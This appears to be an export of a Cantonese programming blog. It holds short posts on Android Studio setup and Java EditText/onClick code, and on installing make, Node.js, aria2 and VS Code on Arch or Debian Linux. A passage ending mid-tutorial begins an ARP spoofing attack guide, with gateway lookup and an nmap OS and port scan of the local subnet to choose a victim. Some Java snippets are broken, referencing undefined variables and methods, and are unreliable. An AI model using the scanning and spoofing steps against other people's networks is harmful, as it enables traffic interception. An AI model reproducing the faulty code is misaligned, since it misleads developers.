<h2 id="開啟檔案下載"><a href="#開啟檔案下載" class="headerlink" title="開啟檔案下載"></a>開啟檔案下載</h2><p>撳 <code>Next</code></p>
<img src="/2022/01/11/Android-Studio-install/1.png" class="">

<h3 id="安裝選擇"><a href="#安裝選擇" class="headerlink" title="安裝選擇"></a>安裝選擇</h3><p>Tick 哂佢。</p>
<img src="/2022/01/11/Android-Studio-install/2.png" class="">

<h3 id="安裝位置"><a href="#安裝位置" class="headerlink" title="安裝位置"></a>安裝位置</h3><p>選擇你既安裝位置。</p>
<img src="/2022/01/11/Android-Studio-install/3.png" class="">

<h3 id="Startup-ment-folder"><a href="#Startup-ment-folder" class="headerlink" title="Startup ment folder"></a>Startup ment folder</h3><p>可要可唔要。</p>
<img src="/2022/01/11/Android-Studio-install/4.png" class="">

<h3 id="安裝中-…"><a href="#安裝中-…" class="headerlink" title="安裝中 …"></a>安裝中 …</h3><p>等佢完成安裝就得了</p>
<img src="/2022/01/11/Android-Studio-install/5.png" class="">

<h3 id="Done-…-Next"><a href="#Done-…-Next" class="headerlink" title="Done … Next"></a>Done … Next</h3><img src="/2022/01/11/Android-Studio-install/6.png" class="">

<h3 id="下載完成"><a href="#下載完成" class="headerlink" title="下載完成"></a>下載完成</h3><p>可以開 Android Studio 了。</p>
<img src="/2022/01/11/Android-Studio-install/7.png" class="">

<h2 id="Settings"><a href="#Settings" class="headerlink" title="Settings"></a>Settings</h2><p>第一次開佢會問你唔洗 Import 你有既 Android Studio Settings (Files)<br>咁我地冇就撳 Do not import settings</p>
<img src="/2022/01/11/Android-Studio-install/8.png" class="">

<h3 id="啟動"><a href="#啟動" class="headerlink" title="啟動"></a>啟動</h3><p>開啟中…</p>
<img src="/2022/01/11/Android-Studio-install/9.png" class="">

<h3 id="Google-Track"><a href="#Google-Track" class="headerlink" title="Google Track"></a>Google Track</h3><p>佢問你要唔要俾 Google Track，咁緊係咪撚Track我啦，所以撳 <code>Don&#39;t send</code></p>
<img src="/2022/01/11/Android-Studio-install/10.png" class="">

<h3 id="Update-Kotlin"><a href="#Update-Kotlin" class="headerlink" title="Update Kotlin ?"></a>Update Kotlin ?</h3><p>右下角問你洗唔洗 Update Kotlin，由於我地係用緊Java寫，所以唔洗，我地撳 <code>Ignore this update</code></p>
<img src="/2022/01/11/Android-Studio-install/11.png" class="">

<h3 id="Next"><a href="#Next" class="headerlink" title="Next"></a>Next</h3><p>之後撳 <code>Next</code></p>
<img src="/2022/01/11/Android-Studio-install/12.png" class="">

<h3 id="Install-Type"><a href="#Install-Type" class="headerlink" title="Install Type"></a>Install Type</h3><p>撳 <code>Standard</code> 之後撳 Next</p>
<img src="/2022/01/11/Android-Studio-install/13.png" class="">

<h3 id="Select-UI-Themes"><a href="#Select-UI-Themes" class="headerlink" title="Select UI Themes"></a>Select UI Themes</h3><p>呢度佢問你 Themes 你想用Light 定 Dark，你選擇返你想用既 Themes就 OK，之後撳 <code>Next</code></p>
<img src="/2022/01/11/Android-Studio-install/14.png" class="">

<h3 id="Next-1"><a href="#Next-1" class="headerlink" title="Next"></a>Next</h3><p>呢度全部都要裝，所以撳 <code>Next</code></p>
<img src="/2022/01/11/Android-Studio-install/15.png" class="">

<h3 id="安裝中-…-1"><a href="#安裝中-…-1" class="headerlink" title="安裝中 …"></a>安裝中 …</h3><p>安裝中…</p>
<img src="/2022/01/11/Android-Studio-install/16.png" class="">

<h3 id="Finish"><a href="#Finish" class="headerlink" title="Finish"></a>Finish</h3><p>完成之後就撳 Finish</p>
<img src="/2022/01/11/Android-Studio-install/17.png" class="">

<h3 id="Done"><a href="#Done" class="headerlink" title="Done"></a>Done</h3><p>咁我地就安裝成功啦</p>
<img src="/2022/01/11/Android-Studio-install/18.png" class="">]]></content>
      <categories>
        <category>Android Studio</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Apps</tag>
        <tag>安裝</tag>
      </tags>
  </entry>
  <entry>
    <title>Android Studio - .isEmpty() | 檢查 EditText 入面係咪冇打野</title>
    <url>/2022/02/17/Android-Studio-check-boolean-text-empty/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>如果你好似平時咁 <code>if input == &quot;&quot;</code>，<br>咁會出現一個問題，<br>就係當用戶打 <code>&quot; &quot;</code><br>入面係佢打空白鍵，<br>咁既時候佢都會當你唔係冇打野，<br>要解決呢個問題有好多方法<br>而今篇，會講用 <code>.isEmpty()</code> 判斷 EditText 入面係冇打野，</p>
<h1 id="開始"><a href="#開始" class="headerlink" title="開始"></a>開始</h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1"><i class="fab fa-android"></i> .isEmpty() Version1 (建議方法)</button></li><li class="tab"><button type="button" data-href="#test1-2"><i class="fab fa-android"></i> .isEmpty() Version2 (自己開 function)</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">btn_con</span><span class="params">(View v)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        EditText textbox_nameinput = (EditText) findViewById(R.id.textbox_nameinput);</span><br><span class="line"></span><br><span class="line">        String textbox1 = textbox_nameinput.getText().toString().trim();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (textbox1.isEmpty())</span><br><span class="line">        &#123;</span><br><span class="line">            textbox_nameinput.setError(<span class="string">&quot;你未打野入黎。&quot;</span>);</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">btn_con</span><span class="params">(View v)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        EditText textbox_nameinput = (EditText) findViewById(R.id.textbox_nameinput);</span><br><span class="line">        String ourEditTextString = editText.getText().toString();</span><br><span class="line">        String ourEditTextNoSpaces = ourEditTextString.replaceAll(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">boolean</span> isOurEditTextEmpty = ourEditTextNoSpaces.isEmpty();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (textbox1.isOurEditTextEmpty())</span><br><span class="line">        &#123;</span><br><span class="line">            textbox_nameinput.setError(<span class="string">&quot;你未打野入黎。&quot;</span>);</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>

<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>拎 EditText 入面既料<br>然後再用 <code>.isEmpty()</code> 呢個 function<br>當如果呢舊野入面係冇打既野時候，<br>條件就會成立，<br>然後就判斷為冇打到野。</p>
<p>而 else 就係相反，<br>你有打到野。</p>
<p>基本上所有字都計，<br>除左你撳 <code>空白鍵</code> 唔計。</p>
<p>分別大同小異。</p>
<p>參考資料<br><a href="https://stackoverflow.com/questions/20349522/android-check-if-edittext-is-empty-when-inputtype-is-set-on-number-phone/55621072">https://stackoverflow.com/questions/20349522/android-check-if-edittext-is-empty-when-inputtype-is-set-on-number-phone/55621072</a></p>
]]></content>
      <categories>
        <category>Android Studio</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Apps</tag>
      </tags>
  </entry>
  <entry>
    <title>Android-Studio - 實現 item event 方法</title>
    <url>/2022/01/12/Android-Studio-onClick-event/</url>
    <content><![CDATA[<h1 id="以下"><a href="#以下" class="headerlink" title="以下"></a>以下</h1><p>以下內容並唔係得 Button 可以用到，其他 item 都得。</p>
<h1 id="開始"><a href="#開始" class="headerlink" title="開始"></a>開始</h1><p>首先，喺你既 ToolsBox 拉個 Button 入去你既程式介面度</p>
<p>之後去你既 介面既 code 度睇 (activity_main.xml)</p>
<p>搵你要做 event 既 Button</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">&quot;@+id/Buttonhello&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;182dp&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;136dp&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_marginTop</span>=<span class="string">&quot;312dp&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br></pre></td></tr></table></figure>

<p>加呢行 code</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">android:onClick=&quot;buttonhello&quot;</span><br></pre></td></tr></table></figure>

<p>“”包住既就係你既 button 既名</p>
<p>完整code 係咁</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">&quot;@+id/Buttonhello&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;182dp&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;136dp&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_marginTop</span>=<span class="string">&quot;312dp&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:onClick</span>=<span class="string">&quot;buttonhello&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br></pre></td></tr></table></figure>

<p>然後我地係仲未 import View 既，<br>所以我地喺最上加呢行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> android.view.View;</span><br></pre></td></tr></table></figure>

<p>跟住去返 <code>MainActivity.java</code></p>
<p>喺 main 入面加</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">TextView tv1 = (TextView) findViewById(R.id.textView);</span><br><span class="line"><span class="comment">//        |                                     |</span></span><br><span class="line"><span class="comment">//        |___你起既名                           |______ 你個 Label 既 ID</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">buttonhello</span> <span class="params">(View view)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 呢度就係你 Clcik 左個 Button會做既 event</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>完整code 係咁</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    TextView tv1 = (TextView) findViewById(R.id.textView);</span><br><span class="line">    <span class="comment">//        |                                     |</span></span><br><span class="line">    <span class="comment">//        |___你起既名                           |______ 你個 Label 既 ID</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">buttonhello</span> <span class="params">(View view)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 呢度就係你 Clcik 左個 Button會做既 event</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>咁就完成啦。</p>
<p>參考資料:<br><a href="https://spicyboyd.blogspot.com/2018/04/apponclick5.html">https://spicyboyd.blogspot.com/2018/04/apponclick5.html</a></p>
]]></content>
      <categories>
        <category>Android Studio</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Apps</tag>
      </tags>
  </entry>
  <entry>
    <title>Arch Linux - 安裝 make</title>
    <url>/2022/01/14/Arch-Linux-install-make/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Arch Linux 系統底下 本身係冇 make 既就例如好似 Manjaro 咁。</p>
<p>係要另外再裝，所以今篇文係講點樣喺 Arch Linux 度裝 make.</p>
<h1 id="安裝"><a href="#安裝" class="headerlink" title="安裝"></a>安裝</h1><p>我地需要以下呢啲先可以進行</p>
<ul>
<li>base-devel autoconf</li>
<li>base-devel automake</li>
<li>base-devel bin86</li>
<li>base-devel bison</li>
<li>base-devel csup</li>
<li>base-devel diffutils</li>
<li>base-devel ed</li>
<li>base-devel fakeroot</li>
<li>base-devel flex</li>
<li>base-devel gcc</li>
<li>base-devel libtool</li>
<li>base-devel m4</li>
<li>base-devel make</li>
<li>base-devel patch</li>
<li>base-devel pkgconfig</li>
</ul>
<p>我地打呢句就會包含哂上面既野</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[on9@on9-o ~]$ sudo pacman -S base-devel</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[on9@on9-o ~]$ make</span><br><span class="line">make: *** No targets specified and no makefile found.  Stop.</span><br></pre></td></tr></table></figure>

<h1>成功。</h1>

<p>參考資料:<br><a href="https://bbs.archlinux.org/viewtopic.php?id=61739">https://bbs.archlinux.org/viewtopic.php?id=61739</a><br><a href="https://www.linuxquestions.org/questions/arch-29/bash-make-command-not-found-759042/">https://www.linuxquestions.org/questions/arch-29/bash-make-command-not-found-759042/</a></p>
]]></content>
      <categories>
        <category>Arch Linux</category>
      </categories>
      <tags>
        <tag>安裝</tag>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>Arch Linux - 裝 NPM NodeJS</title>
    <url>/2022/02/15/Arch-Linux-install-nodejs-npm/</url>
    <content><![CDATA[<h1 id="一句完成安裝"><a href="#一句完成安裝" class="headerlink" title="一句完成安裝"></a>一句完成安裝</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -S nodejs npm</span><br></pre></td></tr></table></figure>

<p>detail<br><a href="https://nodejs.org/en/download/package-manager/#arch-linux">https://nodejs.org/en/download/package-manager/#arch-linux</a></p>
]]></content>
      <categories>
        <category>Arch Linux</category>
      </categories>
      <tags>
        <tag>安裝</tag>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>Aria2 - 多線程下載工具</title>
    <url>/2021/12/22/Aria2c-commands/</url>
    <content><![CDATA[<h1 id="Aria2"><a href="#Aria2" class="headerlink" title="Aria2"></a>Aria2</h1><p><a href="https://aria2.github.io/">Aria2</a> 是一個開源且免費的輕量級多協議和多服務器命令行下載實用程序，適用於 Windows、Linux 和 Mac OSX。<br>它能夠從多種協議和來源下載文件，包括 HTTP/HTTPS、FTP、BitTorrent 和 Metalink。 它通過利用最大下載帶寬來提高下載速度並加快您的下載速度。 </p>
<h1 id="特徵"><a href="#特徵" class="headerlink" title="特徵"></a>特徵</h1><ul>
<li>命令行界面</li>
<li>通過 HTTP(S)/FTP/SFTP/BitTorrent 下載文件</li>
<li>多線程下載文件</li>
<li>可自訂下載/上傳速度限制</li>
<li>Metalink 版本 4 (RFC 5854) 支持(HTTP/FTP/SFTP/BitTorrent)</li>
<li>Metalink 3.0 版本支持(HTTP/FTP/SFTP/BitTorrent)</li>
<li>Metalink/HTTP (RFC 6249) 支持</li>
<li>HTTP/1.1 實現</li>
<li>HTTP 代理支持</li>
</ul>
<h1 id="APT-Package-安裝"><a href="#APT-Package-安裝" class="headerlink" title="APT Package 安裝"></a>APT Package 安裝</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install aria2 -y</span><br></pre></td></tr></table></figure>

<img src="/2021/12/22/Aria2c-commands/i.png" class="">


<h1 id="下載指令"><a href="#下載指令" class="headerlink" title="下載指令"></a>下載指令</h1><p>aria2c 提供了很多下載的參數，以下是常用指令參數。</p>
<hr>
<h2 id="多線程下載"><a href="#多線程下載" class="headerlink" title="多線程下載"></a>多線程下載</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">aria2c -x 16 [url]</span><br><span class="line"><span class="meta">#</span><span class="bash">          |</span></span><br><span class="line"><span class="meta">#</span><span class="bash">          ----&gt; the number of connections</span></span><br></pre></td></tr></table></figure>

<h2 id="Bitorrent-下載"><a href="#Bitorrent-下載" class="headerlink" title="Bitorrent 下載"></a>Bitorrent 下載</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">aria2c http://example.org/mylinux.torrent</span><br></pre></td></tr></table></figure>

<h2 id="BitTorrent-Magnet-下載"><a href="#BitTorrent-Magnet-下載" class="headerlink" title="BitTorrent Magnet 下載"></a>BitTorrent Magnet 下載</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aria2c &#x27;magnet:?xt=urn:btih:248D0A1CD08284299DE78D5C1ED359BB46717D8C&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="Metalink-下載"><a href="#Metalink-下載" class="headerlink" title="Metalink 下載"></a>Metalink 下載</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">aria2c http://example.org/mylinux.metalink</span><br></pre></td></tr></table></figure>

<h2 id="讀取文字檔連結下載"><a href="#讀取文字檔連結下載" class="headerlink" title="讀取文字檔連結下載"></a>讀取文字檔連結下載</h2><p>於文字檔內輸入貼上要下載的結結，每一行代表一個連結。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aria2c -i uris.txt</span><br></pre></td></tr></table></figure>

<h2 id="設置下載速度限制"><a href="#設置下載速度限制" class="headerlink" title="設置下載速度限制"></a>設置下載速度限制</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">aria2c –max-download-limit=100K [link]</span><br></pre></td></tr></table></figure>

<h2 id="示範下載"><a href="#示範下載" class="headerlink" title="示範下載"></a>示範下載</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">aria2c -x 16 https://cdimage.kali.org/kali-2022.2/kali-linux-2022.2-installer-amd64.iso</span><br></pre></td></tr></table></figure>

<img src="/2021/12/22/Aria2c-commands/d.png" class="">]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>Arch Linux - 裝 Visual Studio Code</title>
    <url>/2022/02/15/Arch-Linux-install-vscode/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>要喺 Arch Linux 度裝 <a href="https://code.visualstudio.com/">Visual Studio Code</a>，</p>
<p>如果係 debian，Fedora，<br>呢啲系統既話都會有 deb or rpm，<br>但係喺 Arch 系統底下唔同。</p>
<p>裝既放法係有好多，<br>包括</p>
<ul>
<li>snapd</li>
<li>build</li>
</ul>
<p>接下來我會講點裝法 ~</p>
<h1 id="開始"><a href="#開始" class="headerlink" title="開始"></a>開始</h1><p>首先我地去 Arch Linux 既官網先<br><a href="https://wiki.archlinux.org/title/Visual_Studio_Code#Installation">https://wiki.archlinux.org/title/Visual_Studio_Code#Installation</a></p>
<p>呢到呢個位我地撳 <code>visual-studio-code-binAUR</code></p>
<img src="/2022/02/15/Arch-Linux-install-vscode/1.png" class="">

<p>之後佢會去左第2頁<br><a href="https://aur.archlinux.org/packages/visual-studio-code-bin">https://aur.archlinux.org/packages/visual-studio-code-bin</a></p>
<p>我地撳 Git Clone URL 個條 link copy<br><a href="https://aur.archlinux.org/visual-studio-code-bin.git">https://aur.archlinux.org/visual-studio-code-bin.git</a></p>
<img src="/2022/02/15/Arch-Linux-install-vscode/2.png" class="">

<p>去到呢個位我地而加係需要裝 git</p>
<p>我地更新左先</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -Sy</span><br></pre></td></tr></table></figure>
<img src="/2022/02/15/Arch-Linux-install-vscode/3.png" class="">

<p>再裝 git</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -S git</span><br></pre></td></tr></table></figure>
<img src="/2022/02/15/Arch-Linux-install-vscode/4.png" class="">

<p>搞掂之後再 git clone 岩岩條 link</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://aur.archlinux.org/visual-studio-code-bin.git</span><br></pre></td></tr></table></figure>
<img src="/2022/02/15/Arch-Linux-install-vscode/5.png" class="">

<p>我地再 cd 入去</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd visual-studio-code-bin</span><br></pre></td></tr></table></figure>

<img src="/2022/02/15/Arch-Linux-install-vscode/6.png" class="">

<p>ls 睇下你會見到呢堆 file</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls</span><br><span class="line">PKGBUILD                        visual-studio-code-bin.sh   visual-studio-code-url-handler.desktop</span><br><span class="line">visual-studio-code-bin.install  visual-studio-code.desktop  visual-studio-code-workspace.xml</span><br></pre></td></tr></table></figure>

<img src="/2022/02/15/Arch-Linux-install-vscode/7.png" class="">

<p>而加我地整個 package file for arch linux 安裝用既檔 ~</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">makepkg -s</span><br></pre></td></tr></table></figure>

<img src="/2022/02/15/Arch-Linux-install-vscode/8.png" class="">

<p>完成之後你再睇下你會發現多左幾個 file,folder.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure>
<img src="/2022/02/15/Arch-Linux-install-vscode/9.png" class="">

<p>我地而加正式開始裝 ~</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -U visual-studio-code-bin-1.64.2-1-x86_64.pkg.tar.zst</span><br></pre></td></tr></table></figure>
<img src="/2022/02/15/Arch-Linux-install-vscode/10.png" class="">

<p>然後你打 <code>code</code><br>就會開到 Visual Studio Code ~<br>咁就安裝成功啦 ~</p>
<img src="/2022/02/15/Arch-Linux-install-vscode/11.png" class="">

<p>又或者你 Search <code>code</code><br>都會見到多左個 Visual Studio Code ~</p>
<img src="/2022/02/15/Arch-Linux-install-vscode/12.png" class="">

<p>參考資料<br><a href="https://linuxhint.com/install_visual_studio_code_arch_linux/">https://linuxhint.com/install_visual_studio_code_arch_linux/</a></p>
]]></content>
      <categories>
        <category>Arch Linux</category>
      </categories>
      <tags>
        <tag>安裝</tag>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>ArpSpoof - 一個執行 ARP 欺騙攻擊的工具</title>
    <url>/2021/12/11/ArpSpoof-commands/</url>
    <content><![CDATA[<img src="cover.svg" width="200px"/>

<h1 id="ArpSpoof"><a href="#ArpSpoof" class="headerlink" title="ArpSpoof"></a>ArpSpoof</h1><p>一種對本地未加密網絡上的其他人執行 ARP 欺騙攻擊的程序。</p>
<div class="post-outdate-notice">
    警告 : 文章的功擊手段，在公眾範圍亂對他人使用，而又被發現是你造成，會有機會造成法律問題，請小心行動。</br>
    警告 : 文章的功擊手段，在公眾範圍亂對他人使用，而又被發現是你造成，會有機會造成法律問題，請小心行動。</br>
    警告 : 文章的功擊手段，在公眾範圍亂對他人使用，而又被發現是你造成，會有機會造成法律問題，請小心行動。
</div>

<h1 id="功擊條件，資訊要求"><a href="#功擊條件，資訊要求" class="headerlink" title="功擊條件，資訊要求"></a>功擊條件，資訊要求</h1><p>首要條件要係同一個 Network 底下先可以發動功擊。</p>
<p>要發動功擊我地要搵兩樣野：</p>
<ul>
<li>你而加既 route 既 Gateway IP Address (route 搵)</li>
<li>你而加既 route 既 Gateway Interface name (route 搵)</li>
<li>目標既 IP Address (Nmap 搵)</li>
</ul>
<h1 id="Gateway-格式"><a href="#Gateway-格式" class="headerlink" title="Gateway 格式"></a>Gateway 格式</h1><ul>
<li>喺屋企既通常都係 192.168.0.1</li>
<li>公司，學校可以會係 10.0.0.1</li>
</ul>
<p>但係我地唔會咁傻仔走去慢慢試，所以我會講點樣最直接搵 Gateway 既 IP，<br>方法有幾種，可以用唔同既指令搵，而今篇我會用 <code>route</code> 去教大家搵 Gateway IP Address。</p>
<h1 id="安裝-net-tools"><a href="#安裝-net-tools" class="headerlink" title="安裝 net-tools"></a>安裝 net-tools</h1><p>要查資料既話，首先我地係需要用到接下來講既呢個指令 <code>route</code>，<code>ifconfig</code>，<br>我地需要確保你部機係已經安裝左以下既套件，我地打以下呢句安裝。</p>
<div class="note info flat">
    說明 : 即使你覺得你本身已經裝好都唔洗擔心，打多次唔會再裝多個，唔似 Windows 咁。
</div>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:~# sudo apt-get install net-tools -y</span><br></pre></td></tr></table></figure>

<img src="/2021/12/11/ArpSpoof-commands/net-tools.png" class="">

<h2 id="尋找-Gateway-IP-Address，Interface-Name"><a href="#尋找-Gateway-IP-Address，Interface-Name" class="headerlink" title="尋找 Gateway IP Address，Interface Name"></a>尋找 Gateway IP Address，Interface Name</h2><p>喺 Terminal 輸入以下指令。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">route -n</span><br></pre></td></tr></table></figure>

<ul>
<li><span style="color:lightblue">藍色圈</span>既 <code>192.168.0.1</code> 就係我地要搵既 Gataway IP Addres</li>
<li><span style="color:darkred">紅色圈</span>既 <code>eth0</code> 就係我地要搵既 Inerface name</li>
</ul>
<img src="/2021/12/11/ArpSpoof-commands/route%20-n.png" class="">


<p>我地可以睇到 <code>Gateway</code> 係寫 <code>192.168.0.1</code></p>
<p>然後 <code>Iface</code> 係寫 <code>eth0</code>。</p>
<h1 id="安裝-nmap"><a href="#安裝-nmap" class="headerlink" title="安裝 nmap"></a>安裝 nmap</h1><p>如果部機本身冇 <code>Nmap</code> 就打呢抽野裝 :</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sudo apt-get install nmap -y</span></span><br></pre></td></tr></table></figure>

<img src="/2021/12/11/ArpSpoof-commands/ni.png" class="">

<h2 id="尋找功擊目標裝置-Scan-Network"><a href="#尋找功擊目標裝置-Scan-Network" class="headerlink" title="尋找功擊目標裝置 (Scan Network)"></a>尋找功擊目標裝置 (Scan Network)</h2><p>而加我地要搵埋我地要進行功擊既 Device 係乜</p>
<p>我地用 <code>nmap</code> Scan 下個 Network 有乜機俾你打。</p>
<div class="note warning flat">
    注意 : 大細階喺好有分別，請<code>注意注意注意</code>有冇打錯。
</div>

<div class="note info flat">
    說明 : nmap 有好多唔同既參數俾你用，你都可以唔洗跟我咁樣打黎 Scan Network。
</div>


<ul>
<li><code>-sS -O</code> 呢種方法可以列出呢個裝置既 : Ports, Service Name, Mac Addres, IP Address。</li>
<li><code>/24</code> 解整個 Network，如果不輸入 <code>/24</code> 就只有 Scan 指定一個裝置。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sS -O 192.168.0.1/24</span></span><br></pre></td></tr></table></figure>

<p>我地輸入完呢句指令之後，會發現到好多唔同既裝置，呢度我地要確定兩樣野，包括係你想搞既個部機既 :</p>
<ul>
<li>IP Address (裝置位置)</li>
<li>名稱 (裝置名稱)</li>
</ul>
<p>確定左係你想打既目標之後就記住佢既 IP ADDRESS，然後去下一個步驟。</p>
<img src="/2021/12/11/ArpSpoof-commands/nmapsso%200.png" class="">

<h1 id="安裝-Arpspoof"><a href="#安裝-Arpspoof" class="headerlink" title="安裝 Arpspoof"></a>安裝 Arpspoof</h1><p>喺功擊之前，我地需要下載 <code>Arpspoof</code> 呢款工具，輸入以下指令安裝。</p>
